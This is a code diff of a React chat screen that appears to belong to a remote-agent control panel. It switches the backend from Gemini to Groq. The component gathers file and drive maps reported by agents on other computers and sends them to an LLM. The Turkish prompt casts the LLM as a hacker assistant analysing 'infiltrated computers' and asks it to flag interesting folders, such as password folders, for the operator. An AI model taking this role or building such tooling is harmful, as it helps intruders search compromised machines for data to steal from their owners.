@@ -1,16 +1,22 @@
 import { useState, useEffect, useRef } from 'react'
 import { api } from '../api'
-import { Bot, Send, Terminal, Sparkles, Cpu, Search, Trash2 } from 'lucide-react'
-import { GoogleGenerativeAI } from "@google/generative-ai"
+import { Bot, Send, Terminal, Sparkles, Cpu, Search, Trash2, ChevronDown } from 'lucide-react'
+
+const GROQ_MODELS = [
+  { id: 'llama-3.3-70b-versatile', label: 'Llama 3.3 70B (Güçlü)' },
+  { id: 'llama-3.1-8b-instant',    label: 'Llama 3.1 8B (Hızlı)' },
+  { id: 'mixtral-8x7b-32768',     label: 'Mixtral 8x7B (Dengeli)' }
+]
 
 export default function Chat() {
   const [messages, setMessages] = useState([
-    { role: 'ai', text: 'Sistem taraması tamamlandı. Ashfir Intelligence çevrimiçi. Bilgisayarındaki dosyalar hakkında ne bilmek istersin?' }
+    { role: 'ai', text: 'Groq Neural Link aktif. Ashfir Intelligence emrinde. Hangi modeli kullanarak analiz yapalım?' }
   ])
   const [input, setInput] = useState('')
   const [loading, setLoading] = useState(false)
-  const [apiKey, setApiKey] = useState(localStorage.getItem('gemini_key') || '')
-  const [showKeyInput, setShowKeyInput] = useState(!localStorage.getItem('gemini_key'))
+  const [apiKey, setApiKey] = useState(localStorage.getItem('groq_key') || '')
+  const [selectedModel, setSelectedModel] = useState(localStorage.getItem('selected_model') || GROQ_MODELS[0].id)
+  const [showKeyInput, setShowKeyInput] = useState(!localStorage.getItem('groq_key'))
   const chatEndRef = useRef(null)
 
   const scrollToBottom = () => {
@@ -23,7 +29,7 @@ export default function Chat() {
 
   const saveKey = (e) => {
     e.preventDefault()
-    localStorage.setItem('gemini_key', apiKey)
+    localStorage.setItem('groq_key', apiKey)
     setShowKeyInput(false)
   }
 
@@ -37,35 +43,50 @@ export default function Chat() {
     setLoading(true)
 
     try {
-      // 1. Resmi kütüphaneyi başlat
-      const genAI = new GoogleGenerativeAI(apiKey)
-      const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash"})
-
-      // 2. Ajanın topladığı sistem bilgisini çek
-      const stats = await api.getStats()
-      const fileKnowledge = stats.directory_map?._ai_knowledge || {}
+      // 1. TÜM AJANLARIN sistem bilgisini çek
+      const agentsRes = await api.getAgents()
+      const allAgentsData = (agentsRes.agents || []).map(a => ({
+        machine: a.machine_name,
+        online: a.online,
+        // Ajanın gönderdiği o derin tarama listesi (important_files)
+        important_files: a.directory_map?._ai_knowledge?.important_files || [],
+        drives: a.directory_map?._ai_knowledge?.drives || []
+      }))
       
-      // 3. Prompt'u hazırla
+      // 2. Prompt'u hazırla
       const prompt = `
-        Sen "Ashfir Intelligence" (AI) adında, sızılan bilgisayarı analiz eden profesyonel bir asistansın.
-        Aşağıda bilgisayardaki dosya sistemi ve klasör yapısı bulunmaktadır. 
-        Kullanıcının sorusuna bu dosya yapısına göre cevap ver.
+        Sen "Ashfir Intelligence" (AI) adında, sızılan bilgisayarları analiz eden profesyonel bir asistansın.
+        Aşağıda sistemdeki bağlı ajanların (bilgisayarların) dosya haritaları bulunmaktadır.
+        Kullanıcının sorusuna bu dosya yapılarına göre cevap ver.
         Dosya içeriğini bilmiyorsun, sadece isimleri ve konumları biliyorsun.
-        Eğer ilginç bir klasör görürsen (örn: "Özel", "Şifreler", "Proje_X") kullanıcıya öner.
+        Eğer ilginç bir klasör veya dosya görürsen kullanıcıya öner.
         Cevaplarını kısa, profesyonel ve bir hacker asistanı tonunda ver.
         
-        SISTEM BILGISI:
-        ${JSON.stringify(fileKnowledge, null, 2)}
+        BAGLI AJANLAR VE DOSYALARI:
+        ${JSON.stringify(allAgentsData, null, 2)}
         
         KULLANICI SORUSU:
         ${userMsg}
       `
 
-      // 4. İsteği at
-      const result = await model.generateContent(prompt)
-      const response = await result.response
-      const aiResponse = response.text()
+      // 3. Groq API'ye istek at (OpenAI uyumlu)
+      const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${apiKey}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          model: selectedModel,
+          messages: [{ role: "user", content: prompt }],
+          temperature: 0.7
+        })
+      })
+
+      const data = await response.json()
+      if (data.error) throw new Error(data.error.message)
       
+      const aiResponse = data.choices[0].message.content
       setMessages(prev => [...prev, { role: 'ai', text: aiResponse }])
     } catch (error) {
       setMessages(prev => [...prev, { role: 'ai', text: "Hata oluştu: " + error.message }])
@@ -79,44 +100,64 @@ export default function Chat() {
       {/* Header */}
       <div className="flex items-center justify-between mb-6 animate-fade-in">
         <div>
-          <h1 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-cyan-400 tracking-widest flex items-center gap-3">
-            <Sparkles className="w-6 h-6 text-purple-400" />
-            ASHFIR INTELLIGENCE
+          <h1 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-red-500 tracking-widest flex items-center gap-3">
+            <Sparkles className="w-6 h-6 text-orange-400" />
+            GROQ INTELLIGENCE
           </h1>
-          <p className="text-[10px] font-mono text-purple-600 uppercase tracking-[0.2em] mt-1">
-            Neural System Analysis • Gemini Pro Powered
+          <p className="text-[10px] font-mono text-orange-600 uppercase tracking-[0.2em] mt-1">
+            LPU Accelerated Analysis • Groq API Powered
           </p>
         </div>
-        <button 
-          onClick={() => setShowKeyInput(true)}
-          className="btn-ghost !text-purple-400 !border-purple-500/30 flex items-center gap-2"
-        >
-          <Cpu className="w-3.5 h-3.5" />
-          {apiKey ? 'API CONFIGURED' : 'SETUP API'}
-        </button>
+        
+        <div className="flex items-center gap-4">
+          {/* Model Selector */}
+          <div className="relative group">
+            <select 
+              className="appearance-none bg-[#0a0f1d] border border-orange-500/30 text-orange-400 text-[10px] font-mono font-bold py-2 pl-4 pr-10 rounded-lg focus:outline-none focus:border-orange-400 transition-all cursor-pointer hover:bg-orange-500/5"
+              value={selectedModel}
+              onChange={e => {
+                setSelectedModel(e.target.value)
+                localStorage.setItem('selected_model', e.target.value)
+              }}
+            >
+              {GROQ_MODELS.map(m => (
+                <option key={m.id} value={m.id}>{m.label}</option>
+              ))}
+            </select>
+            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-orange-500 pointer-events-none" />
+          </div>
+
+          <button 
+            onClick={() => setShowKeyInput(true)}
+            className="btn-ghost !text-orange-400 !border-orange-500/30 flex items-center gap-2"
+          >
+            <Cpu className="w-3.5 h-3.5" />
+            {apiKey ? 'LINK ESTABLISHED' : 'SETUP LINK'}
+          </button>
+        </div>
       </div>
 
       {/* Key Input Overlay */}
       {showKeyInput && (
         <div className="fixed inset-0 z-50 bg-[#02040a]/90 backdrop-blur-md flex items-center justify-center p-4">
-          <div className="bg-[#0a0f1d] border border-purple-500/30 p-8 rounded-2xl w-full max-w-md shadow-[0_0_50px_rgba(168,85,247,0.15)]">
-            <Bot className="w-12 h-12 text-purple-400 mb-4 mx-auto" />
-            <h2 className="text-xl font-bold text-white text-center mb-2">Gemini API Key</h2>
-            <p className="text-gray-400 text-sm text-center mb-6">AI asistanını aktifleştirmek için Google Gemini API anahtarınızı girin.</p>
+          <div className="bg-[#0a0f1d] border border-orange-500/30 p-8 rounded-2xl w-full max-w-md shadow-[0_0_50px_rgba(249,115,22,0.15)]">
+            <Bot className="w-12 h-12 text-orange-400 mb-4 mx-auto" />
+            <h2 className="text-xl font-bold text-white text-center mb-2">Groq API Key</h2>
+            <p className="text-gray-400 text-sm text-center mb-6">Ultra hızlı analiz için Groq (LPU) API anahtarınızı girin.</p>
             <form onSubmit={saveKey} className="space-y-4">
               <input 
                 type="password"
-                className="inp w-full"
-                placeholder="AIzaSy..."
+                className="inp w-full !border-orange-500/30 focus:!border-orange-500"
+                placeholder="gsk_..."
                 value={apiKey}
                 onChange={e => setApiKey(e.target.value)}
                 required
               />
-              <button className="btn-primary w-full py-3 !bg-purple-600 hover:!bg-purple-500 shadow-[0_0_20px_rgba(168,85,247,0.3)]">
-                ACTIVATE NEURAL LINK
+              <button className="btn-primary w-full py-3 !bg-orange-600 hover:!bg-orange-500 shadow-[0_0_20px_rgba(249,115,22,0.3)]">
+                ESTABLISH LPU LINK
               </button>
               <button type="button" onClick={() => setShowKeyInput(false)} className="w-full text-gray-500 text-xs hover:text-gray-300">
-                LATER
+                CANCEL
               </button>
             </form>
           </div>
